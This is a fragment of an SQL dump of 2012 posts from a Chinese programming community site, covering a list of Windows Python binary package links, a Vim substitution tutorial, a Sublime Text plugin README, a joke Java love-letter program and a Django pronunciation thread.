	('791b33e6d3924fdc94c89dbf84a807ca', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'python模块的windows二进制包', 'lib', NULL, '\n\n大部分windows都没有编译环境，而一些python模块需要编译环境，让人比较伤脑经，下面的二进制包替我们省了不少麻烦。\n\n[pytables](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pytables)\n[scipy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scipy)\n[liblinear](http://www.lfd.uci.edu/~gohlke/pythonlibs/#liblinear)\n[pygments](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygments)\n[vpython](http://www.lfd.uci.edu/~gohlke/pythonlibs/#vpython)\n[scikits-image](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits-image)\n[mahotas](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mahotas)\n[pyglet](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyglet)\n[cx_freeze](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cx_freeze)\n[veusz](http://www.lfd.uci.edu/~gohlke/pythonlibs/#veusz)\n[pgmagick](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pgmagick)\n[vlfd](http://www.lfd.uci.edu/~gohlke/pythonlibs/#vlfd)\n[pyexiv2](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyexiv2)\n[nltk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nltk)\n[networkx](http://www.lfd.uci.edu/~gohlke/pythonlibs/#networkx)\n[opencv](http://www.lfd.uci.edu/~gohlke/pythonlibs/#opencv)\n[pil](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pil)\n[pyreadline](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyreadline)\n[ilastik](http://www.lfd.uci.edu/~gohlke/pythonlibs/#ilastik)\n[nipype](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nipype)\n[statsmodels](http://www.lfd.uci.edu/~gohlke/pythonlibs/#statsmodels)\n[twainmodule](http://www.lfd.uci.edu/~gohlke/pythonlibs/#twainmodule)\n[tornado](http://www.lfd.uci.edu/~gohlke/pythonlibs/#tornado)\n[pyopengl](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyopengl)\n[pyopengl-accelerate](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyopengl-accelerate)\n[pymvpa](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymvpa)\n[matplotlib](http://www.lfd.uci.edu/~gohlke/pythonlibs/#matplotlib)\n[ipython](http://www.lfd.uci.edu/~gohlke/pythonlibs/#ipython)\n[pandas](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pandas)\n[psutil](http://www.lfd.uci.edu/~gohlke/pythonlibs/#psutil)\n[scitools](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scitools)\n[assimulo](http://www.lfd.uci.edu/~gohlke/pythonlibs/#assimulo)\n[nibabel](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nibabel)\n[shapely](http://www.lfd.uci.edu/~gohlke/pythonlibs/#shapely)\n[pygame](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygame)\n[imread](http://www.lfd.uci.edu/~gohlke/pythonlibs/#imread)\n[pyspharm](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyspharm)\n[vtk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#vtk)\n[biopython](http://www.lfd.uci.edu/~gohlke/pythonlibs/#biopython)\n[casuarius](http://www.lfd.uci.edu/~gohlke/pythonlibs/#casuarius)\n[pyodbc](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyodbc)\n[virtualenv](http://www.lfd.uci.edu/~gohlke/pythonlibs/#virtualenv)\n[nipy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nipy)\n[greenlet](http://www.lfd.uci.edu/~gohlke/pythonlibs/#greenlet)\n[nitime](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nitime)\n[pycuda](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pycuda)\n[pyopencl](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyopencl)\n[base](http://www.lfd.uci.edu/~gohlke/pythonlibs/#base)\n[vigra](http://www.lfd.uci.edu/~gohlke/pythonlibs/#vigra)\n[pylibtiff](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pylibtiff)\n[python-igraph](http://www.lfd.uci.edu/~gohlke/pythonlibs/#python-igraph)\n[kivy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#kivy)\n[sqlalchemy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#sqlalchemy)\n[mmtk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mmtk)\n[boost.python](http://www.lfd.uci.edu/~gohlke/pythonlibs/#boost.python)\n[openexr](http://www.lfd.uci.edu/~gohlke/pythonlibs/#openexr)\n[basemap](http://www.lfd.uci.edu/~gohlke/pythonlibs/#basemap)\n[mpi4py](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mpi4py)\n[gmpy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#gmpy)\n[pyfits](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyfits)\n[pyicu](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyicu)\n[twisted](http://www.lfd.uci.edu/~gohlke/pythonlibs/#twisted)\n[pycairo](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pycairo)\n[pysqlite](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pysqlite)\n[pyzmq](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyzmq)\n[bottleneck](http://www.lfd.uci.edu/~gohlke/pythonlibs/#bottleneck)\n[pysfml](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pysfml)\n[mercurial](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mercurial)\n[curses](http://www.lfd.uci.edu/~gohlke/pythonlibs/#curses)\n[videocapture](http://www.lfd.uci.edu/~gohlke/pythonlibs/#videocapture)\n[bazaar](http://www.lfd.uci.edu/~gohlke/pythonlibs/#bazaar)\n[sfepy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#sfepy)\n[pyside](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyside)\n[spyder](http://www.lfd.uci.edu/~gohlke/pythonlibs/#spyder)\n[nlopt](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nlopt)\n[zope.interface](http://www.lfd.uci.edu/~gohlke/pythonlibs/#zope.interface)\n[numpy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#numpy)\n[distribute](http://www.lfd.uci.edu/~gohlke/pythonlibs/#distribute)\n[gdal](http://www.lfd.uci.edu/~gohlke/pythonlibs/#gdal)\n[pyproj](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyproj)\n[ets](http://www.lfd.uci.edu/~gohlke/pythonlibs/#ets)\n[scikits.audiolab](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.audiolab)\n[jcc](http://www.lfd.uci.edu/~gohlke/pythonlibs/#jcc)\n[netcdf4](http://www.lfd.uci.edu/~gohlke/pythonlibs/#netcdf4)\n[psychopy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#psychopy)\n[slycot](http://www.lfd.uci.edu/~gohlke/pythonlibs/#slycot)\n[lxml](http://www.lfd.uci.edu/~gohlke/pythonlibs/#lxml)\n[ndimage](http://www.lfd.uci.edu/~gohlke/pythonlibs/#ndimage)\n[nose](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nose)\n[scikit-learn](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikit-learn)\n[pymc](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymc)\n[mod_wsgi](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mod_wsgi)\n[pymol](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymol)\n[scientificpython](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scientificpython)\n[pylzma](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pylzma)\n[mxbase](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mxbase)\n[visvis](http://www.lfd.uci.edu/~gohlke/pythonlibs/#visvis)\n[cython](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cython)\n[libsbml](http://www.lfd.uci.edu/~gohlke/pythonlibs/#libsbml)\n[gevent](http://www.lfd.uci.edu/~gohlke/pythonlibs/#gevent)\n[bitarray](http://www.lfd.uci.edu/~gohlke/pythonlibs/#bitarray)\n[libsvm](http://www.lfd.uci.edu/~gohlke/pythonlibs/#libsvm)\n[pyamg](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyamg)\n[oursql](http://www.lfd.uci.edu/~gohlke/pythonlibs/#oursql)\n[cvxopt](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cvxopt)\n[psycopg](http://www.lfd.uci.edu/~gohlke/pythonlibs/#psycopg)\n[fipy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#fipy)\n[django](http://www.lfd.uci.edu/~gohlke/pythonlibs/#django)\n[python-ldap](http://www.lfd.uci.edu/~gohlke/pythonlibs/#python-ldap)\n[quantlib](http://www.lfd.uci.edu/~gohlke/pythonlibs/#quantlib)\n[sphinx](http://www.lfd.uci.edu/~gohlke/pythonlibs/#sphinx)\n[cellprofiler](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cellprofiler)\n[pymssql](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymssql)\n[orange](http://www.lfd.uci.edu/~gohlke/pythonlibs/#orange)\n[theano](http://www.lfd.uci.edu/~gohlke/pythonlibs/#theano)\n[libtfr](http://www.lfd.uci.edu/~gohlke/pythonlibs/#libtfr)\n[py2exe](http://www.lfd.uci.edu/~gohlke/pythonlibs/#py2exe)\n[pip](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pip)\n[pywin32](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pywin32)\n[simpleitk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#simpleitk)\n[scikits.odes](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.odes)\n[liblas](http://www.lfd.uci.edu/~gohlke/pythonlibs/#liblas)\n[meshpy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#meshpy)\n[cgal-python](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cgal-python)\n[pymedia](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymedia)\n[milk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#milk)\n[cellcognition](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cellcognition)\n[h5py](http://www.lfd.uci.edu/~gohlke/pythonlibs/#h5py)\n[pycurl](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pycurl)\n[numexpr](http://www.lfd.uci.edu/~gohlke/pythonlibs/#numexpr)\n[ffnet](http://www.lfd.uci.edu/~gohlke/pythonlibs/#ffnet)\n[pywcs](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pywcs)\n[guiqwt](http://www.lfd.uci.edu/~gohlke/pythonlibs/#guiqwt)\n[pyfftw](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyfftw)\n[libxml-python](http://www.lfd.uci.edu/~gohlke/pythonlibs/#libxml-python)\n[pyephem](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyephem)\n[pyfltk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyfltk)\n[thrift](http://www.lfd.uci.edu/~gohlke/pythonlibs/#thrift)\n[pymex](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymex)\n[pymatlab](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymatlab)\n[zodb3](http://www.lfd.uci.edu/~gohlke/pythonlibs/#zodb3)\n[mmlib](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mmlib)\n[pygtk](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pygtk)\n[pywavelets](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pywavelets)\n[pyserial](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyserial)\n[mdp](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mdp)\n[sympy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#sympy)\n[babel](http://www.lfd.uci.edu/~gohlke/pythonlibs/#babel)\n[pyqwt](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyqwt)\n[qimage2ndarray](http://www.lfd.uci.edu/~gohlke/pythonlibs/#qimage2ndarray)\n[pyqt](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyqt)\n[scikits.scattpy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.scattpy)\n[cgkit](http://www.lfd.uci.edu/~gohlke/pythonlibs/#cgkit)\n[pymix](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymix)\n[scikits.vectorplot](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.vectorplot)\n[scikits.ann](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.ann)\n[scikits.delaunay](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.delaunay)\n[natgrid](http://www.lfd.uci.edu/~gohlke/pythonlibs/#natgrid)\n[numeric](http://www.lfd.uci.edu/~gohlke/pythonlibs/#numeric)\n[pulp](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pulp)\n[nmoldyn](http://www.lfd.uci.edu/~gohlke/pythonlibs/#nmoldyn)\n[pymutt](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pymutt)\n[pyminuit](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyminuit)\n[iocbio](http://www.lfd.uci.edu/~gohlke/pythonlibs/#iocbio)\n[python-sundials](http://www.lfd.uci.edu/~gohlke/pythonlibs/#python-sundials)\n[pythonmagick](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pythonmagick)\n[smc.freeimage](http://www.lfd.uci.edu/~gohlke/pythonlibs/#smc.freeimage)\n[jpype](http://www.lfd.uci.edu/~gohlke/pythonlibs/#jpype)\n[wxpython](http://www.lfd.uci.edu/~gohlke/pythonlibs/#wxpython)\n[pybox2d](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pybox2d)\n[pyhdf](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyhdf)\n[scikits.umfpack](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.umfpack)\n[dipy](http://www.lfd.uci.edu/~gohlke/pythonlibs/#dipy)\n[pycogent](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pycogent)\n[pyyaml](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyyaml)\n[pysparse](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pysparse)\n[mmseg](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mmseg)\n[pynifti](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pynifti)\n[scikits.samplerate](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.samplerate)\n[scikits.timeseries](http://www.lfd.uci.edu/~gohlke/pythonlibs/#scikits.timeseries)\n[vitables](http://www.lfd.uci.edu/~gohlke/pythonlibs/#vitables)\n[quickfix](http://www.lfd.uci.edu/~gohlke/pythonlibs/#quickfix)\n[pyode](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyode)\n[numscons](http://www.lfd.uci.edu/~gohlke/pythonlibs/#numscons)\n[pyaudio](http://www.lfd.uci.edu/~gohlke/pythonlibs/#pyaudio)\n[mysql-python](http://www.lfd.uci.edu/~gohlke/pythonlibs/#mysql-python)\n[reportlab](http://www.lfd.uci.edu/~gohlke/pythonlibs/#reportlab)\n[visionegg](http://www.lfd.uci.edu/~gohlke/pythonlibs/#visionegg)\n', 1, 40, 6, '2012-07-21 09:42:24', '2012-07-21 09:42:24', 'sublime text 2'),
	('80b2434dfd0249c4ad347b7ef76503e2', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'Vi/Vim查找替换使用方法', 'vim', NULL, '\n\nvi/vim 中可以使用 ：s 命令来替换字符串。该命令有很多种不同细节使用方法，可以实现复杂的功能，记录几种在此，方便以后查询。\n\n：s/vivian/sky/ 替换当前行第一个 vivian 为 sky \n\n：s/vivian/sky/g 替换当前行所有 vivian 为 sky \n\n：n，$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky \n\n：n，$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky \n\nn 为数字，若 n 为 .，表示从当前行开始到最后一行 \n\n：%s/vivian/sky/（等同于 ：g/vivian/s//sky/） 替换每一行的第一个 vivian 为 sky \n\n：%s/vivian/sky/g（等同于 ：g/vivian/s//sky/g） 替换每一行中所有 vivian 为 sky \n\n可以使用 # 作为分隔符，此时中间出现的 / 不会作为分隔符 \n\n：s#vivian/#sky/# 替换当前行第一个 vivian/ 为 sky/ \n\n：%s+/oradata/apras/+/user01/apras1+ （使用+ 来 替换 / ）： /oradata/apras/替换成/user01/apras1/ \n\n#### ：s/vivian/sky/ 替换当前行第一个 vivian 为 sky \n\n：s/vivian/sky/g 替换当前行所有 vivian 为 sky \n\n#### ：n，$s/vivian/sky/ 替换第 n 行开始到最后一行中每一行的第一个 vivian 为 sky \n\n：n，$s/vivian/sky/g 替换第 n 行开始到最后一行中每一行所有 vivian 为 sky \n\n（n 为数字，若 n 为 .，表示从当前行开始到最后一行） \n\n#### ：%s/vivian/sky/（等同于 ：g/vivian/s//sky/） 替换每一行的第一个 vivian 为 sky \n\n：%s/vivian/sky/g（等同于 ：g/vivian/s//sky/g） 替换每一行中所有 vivian 为 sky \n\n#### 可以使用 # 作为分隔符，此时中间出现的 / 不会作为分隔符 \n\n：s#vivian/#sky/# 替换当前行第一个 vivian/ 为 sky/ \n\n#### 删除文本中的^M \n\n问题描述：对于换行，window下用回车换行（0A0D）来表示，linux下是回车（0A）来表示。这样，将window上的文件拷到unix上用时，总会有个^M.请写个用在unix下的过滤windows文件的换行符（0D）的shell或c程序。 \n\n使用命令：cat filename1 | tr -d “^V^M” > newfile； \n\n使用命令：sed -e “s/^V^M//” filename > outputfilename.需要注意的是在1、2两种方法中，^V和^M指的是Ctrl+V和Ctrl+M.你必须要手工进行输入，而不是粘贴。 \n\n在vi中处理：首先使用vi打开文件，然后按ESC键，接着输入命令：%s/^V^M//. \n\n：%s/^M$//g \n\n如果上述方法无用，则正确的解决办法是： [Page]\n\ntr -d \\"\\\\r\\ " < src >dest \n\ntr -d \\"\\\\015\\ " dest \n\nstrings A>B \n\n#### 替换确认\n\n我们有很多时候会需要某个字符(串)在文章中某些位置出现时被替换，而其它位置不被替换的有选择的操作，这就需要用户来进行确认，vi的查找替换同样支持\n\n例如\n\n：s/vivian/sky/g 替换当前行所有 vivian 为 sky \n\n在命令后面加上一个字母c就可以实现，即：s/vivian/sky/gc\n\n顾名思意，c是confirm的缩写\n\n#### 其它 \n\n利用 ：s 命令可以实现字符串的替换。具体的用法包括： \n\n：s/str1/str2/ 用字符串 str2 替换行中首次出现的字符串 str1 \n\n：s/str1/str2/g 用字符串 str2 替换行中所有出现的字符串 str1 \n\n：。，$ s/str1/str2/g 用字符串 str2 替换正文当前行到末尾所有出现的字符串 str1 \n\n：1，$ s/str1/str2/g 用字符串 str2 替换正文中所有出现的字符串 str1 \n\n：g/str1/s//str2/g 功能同上 \n\n从上述替换命令可以看到：g 放在命令末尾，表示对搜索字符串的每次出现进行替换；不加 g，表示只对搜索 \n\n字符串的首次出现进行替换；g 放在命令开头，表示对正文中所有包含搜索字符串的行进行替换操作\n\n[原文地址]( http://wzgyantai.blogbus.com/logs/28117977.html )\n', 1, 25, 5, '2012-07-13 23:34:39', '2012-07-13 23:34:39', 'sublime text 2'),
	('85df35a856c14da7ba7abcc08c01ab6f', 'c93892ebe02e4ea1a5b06cab6d1e87ab', '0', NULL, 'submineTalkincode 插件介绍', 'sublime text 2,talkincode', NULL, '\n[Sublime Text 2](http://www.sublimetext.com/2) plugin for share source code and publish topic to [Talkincode](http://www.talkincode.org) \n\n### Install\n\nThrough [Package Control](http://wbond.net/sublime_packages/package_control)\n\n`Command Palette` > `Package Control: Install Package` > `SublimeTalkincode`\n\nor clone this repository in\n\n* Windows: `%APPDATA%/Roaming/Sublime Text 2/Packages/`\n* OSX: `~/Library/Application Support/Sublime Text 2/Packages/`\n* Linux: `~/.Sublime Text 2/Packages/`\n* Portable Installation: `Sublime Text 2/Data/`\n\n### Usage\n\n`Command Palette` > `Talkincode.org: ...`\n\n`Context menu` > `Talkincode.org`\n\n### Features\n\n`Register new user`: join talkincode.org,You will receive a authkey\n\n`Post current code`: share current source code to talkincode.org\n\n`Post new topic`: Publish a topic and post to talkincode.org\n\n`Update current topic`:Update currnt topic \n\n`Comment current topic`:Comment on the topic you open\n\n`Search code`:Search talkincode.org code\n\n`Fetch my code`:Fetch my code\n\n`Search topic`:Search talkincode.org topic\n\n`Fetch my topic`:Fetch my topic\n\n*************************************************************************\n[submineTalkincode](http://www.talkincode.org) 是一个[Sublime Text 2](http://www.sublimetext.com/2) 的插件，通过这个插件可以直接在sublime text 2 中分享代码和讨论话题 \n\n### 安装\n\n通过 [Package Control](http://wbond.net/sublime_packages/package_control)\n\n`Command Palette` > `Package Control: Install Package` > `SublimeTalkincode`\n\n或者直接在插件目录克隆这个[仓库](https://github.com/jamiesun/SublimeTalkincode)\n\n* Windows: `%APPDATA%/Roaming/Sublime Text 2/Packages/`\n* OSX: `~/Library/Application Support/Sublime Text 2/Packages/`\n* Linux: `~/.Sublime Text 2/Packages/`\n* Portable Installation: `Sublime Text 2/Data/`\n\n### 如何使用\n\n* `Tools` > `Command Palette` > `Talkincode.org: ...`\n\n* 在编辑器上下文（鼠标右键）菜单中通过Talkincode.org项\n\n* 大部分功能都有快捷键，在菜单 `preferences` > `Package Settings` > `Sublime Talkincode` 你可以找到,   你也可以设置自己习惯的快捷键。\n\n### 功能特性\n\n`Register new user`: 注册成为talkincode.org的成员，你将获得一个authkey，在发布内容时它用来认证身份\n\n`Search code`:搜索talkincode.org的代码，输入关键字，查询请求会发送到talkincode.org，然后返回一个结果列表，你可以查看你感兴趣的代码。\n\n`Fetch my code`:获取自己的代码列表\n\n`Search topic`:和搜索代码一样，你可以搜索你感兴趣的话题，打开一个话题，你还可以对他进行评论。\n\n`Fetch my topic`:获取自己发布的主题\n\n`Post current code`: 将你当前视图中的代码分享到talkincode.org，你可以加入标签，通过包含(单独一行)“@tags:...”，你可以把这些内容放在注释你而不影响代码的运行。比如：\n\n    # @tags:python,helloword\n    print \'hello world\'\n\n`Post new topic`: 发布一个讨论话题到talkincode.org，在talkincode.org中你可以讨论各种关于编程的话题，直接在很酷的sublime text 2编辑器中讨论，这看起来更酷了。\n\n`Update current topic`:修改当前打开的主题\n\n`Comment current topic`:对当前打开的话题进行评论\n\n', 1, 55, 7, '2012-07-11 19:43:19', '2012-07-13 16:49:17', 'sublime text 2'),
	('86ff638f777f4afea8c82f571f13da9b', 'd07d60af92a14169afc444f5d5aeb45a', '', NULL, '给最爱的老婆 Java version', 'java,老婆', NULL, '\n\n1. source https://gist.github.com/3097214\n\n*****************************************************************\n\n    public class 给最爱的老婆 {     \n        // 老婆是私有，全局唯一，不可更改继承的\n        private static final class 老婆 {         \n        // 老婆，\\r 代表换行      \n        private static final String 漂亮等级 = "世界上最美丽的\\r";    \n        private static final String 温柔等级 = "世界上最温柔的\\r";      \n        private static final String 勤劳等级 = "世界上最勤劳的\\r";    \n        private static final String 善良等级 = "世界上最善良的\\r";     \n        private static final String 可爱等级 = "世界上最可爱的\\r";      \n        private static final String 懂我等级 = "世界上最懂我的\\r";      \n        private static final String 疼我等级 = "世界上最疼我的\\r";       \n        private static final String 照顾我等级 = "世界上最精心照顾我的\\r";  \n        private static final String 对我的意义 = "你是我一生最爱的人\\r";        \n        // 老婆是不能构造的，只能迎娶      \n        private 老婆() {         }       \n        private static final 老婆 marryMe() {        \n        return new 老婆();        \n        }         \n        private boolean 笑() {        \n        System.out.println("老婆笑了：)");       \n        return true;      \n        }         \n        private boolean 哭() {         \n        System.out.println("呜呜，老婆伤心了。");       \n        return true;       \n        }         \n        private boolean 不在家() {           \n        System.out.println("老婆不在家。");      \n        return true;        \n        }           \n        private void 生气了() {        \n        throw new Exception("老婆今天很生气，不爱理你。");    \n        }          \n        private void 破涕为笑() {         \n        System.out.println("老婆破涕为笑。");     \n        }          \n        @Override     \n        public String toString() {        \n        return "老婆你是：\\r" + 漂亮等级 + 温柔等级 + 勤劳等级 + 善良等级 + 可爱等级   + "你也是：\\r" + 懂我等级 + 疼我等级 + 照顾我等级 + "总之，\\r" + 对我的意义;         }       }    \n        /*      * 老婆很生气异常      */  \n        private static final class 老婆很生气Exception extends RuntimeException {      \n        private static final long serialVersionUID = 7260098074598571319L;     \n        private 老婆很生气Exception(String msg) {        \n        super(msg);     \n        }    \n        }     \n        @SuppressWarnings("unused")   \n        public static void main(String[] args) {    \n        老婆 myWife = 老婆.marryMe();\n        System.out.println("老婆，首先我想对你说：" + myWife);     \n        System.out.println("如果你笑，");       \n        if (myWife.笑()) {          \n         System.out.println("我更加高兴。\\r");      \n         }        \n        System.out.println("如果你哭，");      \n        if (myWife.哭()) {         \n         System.out.println("我哄你笑。\\r");     \n         }          \n        if (myWife.不在家()) {       \n         System.out.println("我就很难入睡。\\r");       \n         }         \n        System.out.println("生活中难免有琐碎、摩擦。");      \n        try {         \n         myWife.生气了();      \n         } catch (老婆很生气Exception e) {       \n          System.out.println(e.getMessage());         \n          System.out.println("都是我的错，是我不好。请老婆不要生气。");      \n          } finally {            \n           System.out.println("直到....");      \n           myWife.破涕为笑();            \n           // 为了空行       \n           System.out.println();       \n           }        \n          int myAge = 28;       \n          // 爱你一万年       \n          while (myAge <= 10028) {        \n           boolean 我是否爱你 = true;\n           myAge++;\n           }         \n          System.out.println("希望能就这样平平静静的牵你手，一直走。");     \n          System.out.println("我爱你，我的老婆。");     \n          System.out.println("\\t ——你的老公于：2012年5月25日晚");   \n          }   \n    }', 1, 26, 8, '2012-07-12 18:17:38', '2012-07-12 18:17:38', 'sublime text 2'),
	('87e5609b4cc244e297c18f3600dad32d', '4e84ce1b8a5247bb8a6179959438b55f', '', NULL, 'Django怎么读才标准？', 'python,django,CPyUG', NULL, '\n还在纠结Django怎么读才标准吗？\n\nFrom: sleepd\nDate: 2012/6/7\nTo: python-cn@googlegroups.com\n\n\n把这个昆丁爷新作的预告片看到最后就知道了\n\nhttp://v.youku.com/v_show/id_XNDA5MjUxMTQ4.html\n\nFrom: fy0748 \nDate: 2012/6/7\nTo: python-cn@googlegroups.com\n\n\n涨狗\n\n\n----------\nFrom: sunshine \nDate: 2012/6/7\nTo: python-cn@googlegroups.com\n\n\n牛比的电影。\n\n----------\nFrom: 金浩 \nDate: 2012/6/8\nTo: python-cn@googlegroups.com\n\n\n不知道django会不会随着这部电影上映火一把呢。还有不会再有人读成dedjango。\n\n----------\nFrom: qyb \nDate: 2012/6/8\nTo: python-cn@googlegroups.com\n\n\n以后大家都读di-ya-ge\n\n----------\n发件人： Poly Yang \n日期： 2012年6月8日 下午10:35\n收件人： python-cn@googlegroups.com\n\n\n我一般读 滴盎狗\n-- \nBest Regards.\nWhen once you have tasted flight, you will forever walk the earth with your eyes turned skyward, for there you have been and there you will always long to return. \n— Leonardo da Vinci\nWuhan,China. \n\n\n----------\n发件人： bhuztez\n日期： 2012年6月8日 下午10:52\n收件人： "python-cn(华蟒用户组,CPyUG 邮件列表)" <python-cn@googlegroups.com>\n\n\nRTFM https://docs.djangoproject.com/en/dev/faq/general/#what-does-django-mean-and-how-do-you-pronounce-it\n\n----------\n发件人： lee Alexander\n日期： 2012年6月9日 上午12:12\n收件人： python-cn@googlegroups.com\n\n\n很想纠正很多人的读音，不过......\n\n\n\n----------\nFrom: fengjian/风间星魂 \nDate: 2012/6/9\nTo: python-cn@googlegroups.com\n\n\n佐罗么。。。。\n\n\n----------\nFrom: waylybaye \nDate: 2012/6/9\nTo: python-cn@googlegroups.com\n\n\n难道只看电影名没看内容么... 那男主明明说自己叫 咱勾\n\n----------\n发件人： Poly Yang \n日期： 2012年6月9日 上午10:56\n收件人： python-cn@googlegroups.com\n\n\nWhat does “Django” mean, and how do you pronounce it?¶\n\nDjango is named after Django Reinhardt, a gypsy jazz guitarist from the 1930s to early 1950s. To this day, he’s considered one of the best guitarists of all time.\n\nListen to his music. You’ll like it.\n\nDjango is pronounced JANG-oh. Rhymes with FANG-oh. The “D” is silent.\n\nWe’ve also recorded an audio clip of the pronunciation.\n\n\n\n----------\n发件人： dphacker \n日期： 2012年6月10日 下午5:01\n收件人： python-cn@googlegroups.com\n\n\ndjango天时地利啊，得到免费大型宣传，火啦火啦，彻底unchain了！\ndjango社区得做个标准电影宣传网站来感谢昆丁呀~\n\n在 2012年6月8日星期五UTC+8下午9时46分02秒，金浩写道：\n不知道django会不会随着这部电影上映火一把呢。还有不会再有人读成dedjango。\n\n', 1, 34, 9, '2012-07-13 00:49:03', '2012-07-13 16:41:56', 'sublime text 2'),
